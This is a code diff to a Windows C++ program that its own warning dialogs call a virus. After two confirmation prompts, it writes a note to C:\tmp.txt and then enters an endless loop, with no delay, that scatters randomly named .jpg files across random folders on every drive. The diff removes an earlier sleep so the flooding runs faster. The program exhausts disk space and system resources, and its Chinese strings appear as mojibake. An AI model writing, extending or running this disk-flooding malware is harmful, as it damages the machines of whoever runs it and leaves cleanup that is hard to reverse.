@@ -1,4 +1,4 @@
-#include<windows.h>
+ï»¿#include<windows.h>
 #include<tchar.h>
 #include<stdio.h>
 #include<time.h>
@@ -6,6 +6,8 @@
 #include<string>
 #include<vector>
 #include<io.h>
+#include <shlobj.h>
+#pragma comment(lib, "shell32.lib")
 //#include<iostream>
 using namespace std;
 void ReleaseImage(LPCTSTR path) {
@@ -25,9 +27,21 @@ void ReleaseImage(LPCTSTR path) {
 	}
 }
 
+string GetRandomFileName(int length) {
+	string result;
+	for (int i = 0; i < length; i++) {
+		if (rand() % 2)result += char(65 + rand() % 26);
+		else result += char(97 + rand() % 26);
+	}
+	return result;
+}
+
 string GetRandomPath() {
 	static bool first_run = true;
 	static vector<string> drives;
+	static int count = 0;
+	
+	
 	if (first_run) {
 		first_run = false;
 		TCHAR str[200];
@@ -45,7 +59,8 @@ string GetRandomPath() {
 	string path = drives.at(rand() % drives.size());
 	vector<string> tmp;
 	tmp.push_back(_T(""));
-	while (rand() % 10 && !tmp.empty()) {
+	count++;
+	while (rand() % (10+count/1000) && !tmp.empty()) {
 		tmp.clear();
 		_tfinddata_t fileinfo;
 		long lf;
@@ -63,18 +78,31 @@ string GetRandomPath() {
 		_findclose(lf);
 	}
 	return path;
+} 
+void VirusMain() {
+	TCHAR desktop[512];
+	string all_user_desktop="C:\\Users\\Public\\Desktop";
+
+	SHGetSpecialFolderPath(0, desktop, CSIDL_DESKTOPDIRECTORY, 0);
+	while (1) {
+		string s = GetRandomPath();
+		if (_tcscmp(desktop, s.c_str()) == 0||s==all_user_desktop) {
+			continue;
+		}
+		ReleaseImage(s.append(_T("\\")).append(GetRandomFileName(16)).append(_T(".jpg")).c_str());
+	}
 }
 //int main(){
 TCHAR command[233];
 int WINAPI _tWinMain(HINSTANCE, HINSTANCE, LPTSTR, INT) {
 	srand(unsigned(time(nullptr)));
-	if (MessageBox(NULL, _T("ÕâÊÇÒ»¸ö²¡¶¾£¨´ó¸Å\r\nÄãÈ·¶¨Òª¼ÌĞøÔËĞĞËüÂğ£¿"), _T("¾¯¸æ"), MB_YESNO|MB_ICONERROR) == 6) {
-		if (MessageBox(NULL, _T("×îºó¾¯¸æ£º\r\n¸Ã³ÌĞò¿ÉÄÜ»áÕ¼ÓÃ´óÁ¿×ÊÔ´£¬²¢¿ÉÄÜÔì³É²»¿ÉÄæµÄºó¹û£¬È·¶¨¼ÌĞø£¿"), _T("¾¯¸æ"), MB_YESNO|MB_ICONERROR) == 6) {
+	if (MessageBox(NULL, _T("è¿™æ˜¯ä¸€ä¸ªç—…æ¯’ï¼ˆå¤§æ¦‚\r\nä½ ç¡®å®šè¦ç»§ç»­è¿è¡Œå®ƒå—ï¼Ÿ"), _T("è­¦å‘Š"), MB_YESNO|MB_ICONERROR) == 6) {
+		if (MessageBox(NULL, _T("æœ€åè­¦å‘Šï¼š\r\nè¯¥ç¨‹åºå¯èƒ½ä¼šå ç”¨å¤§é‡èµ„æºï¼Œå¹¶å¯èƒ½é€ æˆä¸å¯é€†çš„åæœï¼Œç¡®å®šç»§ç»­ï¼Ÿ"), _T("è­¦å‘Š"), MB_YESNO|MB_ICONERROR) == 6) {
 			HANDLE hfile = CreateFile(_T("C:\\tmp.txt"), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 			if (hfile != INVALID_HANDLE_VALUE) {
 				DWORD dwWritten = 0;
-				const WCHAR str[] = L"±£¹ÜºÃÄãµÄµçÄÔ¡£";
-				const BYTE unicodeHead[] = { 0xFF, 0xFE }; //unicodeÎÄ¼şÍ·ÎÄ¼ş
+				const WCHAR str[] = L"ä¿ç®¡å¥½ä½ çš„ç”µè„‘ã€‚";
+				const BYTE unicodeHead[] = { 0xFF, 0xFE }; //unicodeæ–‡ä»¶å¤´æ–‡ä»¶
 				WriteFile(hfile, unicodeHead, sizeof(unicodeHead), &dwWritten, NULL);
 				WriteFile(hfile, str, sizeof str-sizeof WCHAR, &dwWritten, NULL);
 				CloseHandle(hfile);
@@ -90,12 +118,7 @@ int WINAPI _tWinMain(HINSTANCE, HINSTANCE, LPTSTR, INT) {
 				CloseHandle(information.hProcess);
 				CloseHandle(information.hThread);
 
-				string backup;
-				while (1) {
-					string ws = GetRandomPath();
-					ReleaseImage((ws + _T("\\TBL.jpg")).c_str());
-					Sleep(5);
-				}
+				VirusMain();
 			}
 		}
 	}
